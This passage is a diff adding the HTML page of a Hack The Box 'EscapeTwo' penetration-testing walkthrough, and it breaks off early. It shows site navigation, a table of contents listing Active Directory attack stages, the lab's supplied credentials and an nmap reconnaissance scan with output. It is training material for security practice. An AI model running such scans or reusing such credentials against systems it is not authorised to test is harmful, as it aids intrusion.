@@ -1,0 +1,3645 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.140.2">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            EscapeTwo HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            EscapeTwo HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/redpanda-box/" title="./walkthroughs/redpanda-box/">
+                        
+                            RedPanda HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sau-box/" title="./walkthroughs/sau-box/">
+                        
+                            Sau HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/love-box/" title="./walkthroughs/love-box/">
+                        
+                            Love HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
+                        
+                            Editorial HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
+                        
+                            Forest HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/escapetwo-box/" title="./escapetwo-box/">
+                        
+                            EscapeTwo HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                EscapeTwo HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2025.14.01"
+                            >2025.14.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        22 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/activedirectory/"
+                            class="tag-btn">
+                            ActiveDirectory
+                        </a>
+                    
+                        <a
+                            href="/tags/certificate/"
+                            class="tag-btn">
+                            Certificate
+                        </a>
+                    
+                        <a
+                            href="/tags/ca/"
+                            class="tag-btn">
+                            CA
+                        </a>
+                    
+                        <a
+                            href="/tags/writeowner/"
+                            class="tag-btn">
+                            WriteOwner
+                        </a>
+                    
+                        <a
+                            href="/tags/mssql/"
+                            class="tag-btn">
+                            MSSQL
+                        </a>
+                    
+                        <a
+                            href="/tags/xp_cmdshell/"
+                            class="tag-btn">
+                            xp_cmdshell
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberoasting/"
+                            class="tag-btn">
+                            kerberoasting
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/esc4/"
+                            class="tag-btn">
+                            ESC4
+                        </a>
+                    
+                        <a
+                            href="/tags/shadow-credentials/"
+                            class="tag-btn">
+                            Shadow Credentials
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/escapetwo-box/" class="bread-btn">
+    
+
+    
+        
+            EscapeTwo HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#escapetwo-hack-the-box-walkthrough-writeup">EscapeTwo Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#assumed-breach-box">Assumed Breach Box:</a></li>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+        <li><a href="#performing-a-bloodhound-collection">Performing a Bloodhound Collection:</a></li>
+        <li><a href="#bloodhound-findings">Bloodhound Findings:</a></li>
+        <li><a href="#enumerating-the-ca-using-certipy-ad">Enumerating The CA Using Certipy-ad:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#enumerating-as-oscar">Enumerating As Oscar:</a></li>
+        <li><a href="#mssql-1433">MSSQL <code>1433</code>:</a></li>
+        <li><a href="#using-rce-via-xp-cmdshell-to-get-a-reverse-shell">Using RCE VIA <code>xp_cmdshell</code> To Get A Reverse Shell:</a></li>
+        <li><a href="#enumerating-as-sql-svc">Enumerating As <code>sql_svc</code>:</a></li>
+        <li><a href="#discovering-password-re-use-for-ryan-and-sql-svc">Discovering Password Re-use for <code>ryan</code> &amp; <code>sql_svc</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-lateral-movement">3. Lateral Movement:</a>
+      <ul>
+        <li><a href="#connecting-as-ryan">Connecting As Ryan:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#taking-control-of-ca-svc">Taking Control of <code>ca_svc</code>:</a></li>
+        <li><a href="#re-running-certipy-as-ca-svc">Re-running Certipy As <code>ca_svc</code>:</a></li>
+        <li><a href="#performing-esc4-certificate-attack-to-get-an-admin-certificate">Performing ESC4 Certificate Attack To Get An Admin Certificate:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#dumping-ntds-dot-dit-dcsync-attack">Dumping NTDS.dit/DCSync attack:</a></li>
+        <li><a href="#creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="escapetwo-hack-the-box-walkthrough-writeup">EscapeTwo Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/EscapeTwo">https://app.hackthebox.com/machines/EscapeTwo</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="assumed-breach-box">Assumed Breach Box:</h3>
+<ul>
+<li>This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
+<ul>
+<li><strong>User</strong>: <code>rose</code></li>
+<li><strong>Pass</strong>: <code>KxEPkKe6R8su</code></li>
+</ul>
+</li>
+<li>This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.</li>
+<li>+Note+:
+<ul>
+<li>Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
+<ul>
+<li>This ensures I don’t overlook any findings just because access is available.</li>
+<li>Comprehensive documentation of all discoveries remains essential.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/EscapeTwo/scans/nmap%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2007:55:29%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202025-01-13%2007:56%20GMT%0aNmap%20scan%20report%20for%2010.129.146.182%0aHost%20is%20up%20%280.038s%20latency%29.%0aNot%20shown:%20988%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a1433/tcp%20open%20%20ms-sql-s%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%204.44%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 07:55:29 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-13 07:56 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.146.182
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>1433/tcp open  ms-sql-s
+</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.44 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>Pretty Standard affair for AD, DNS, Kerberos, RPC, LDAP but also MSSQL.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li>
+<p><strong>In depth scan TCP</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
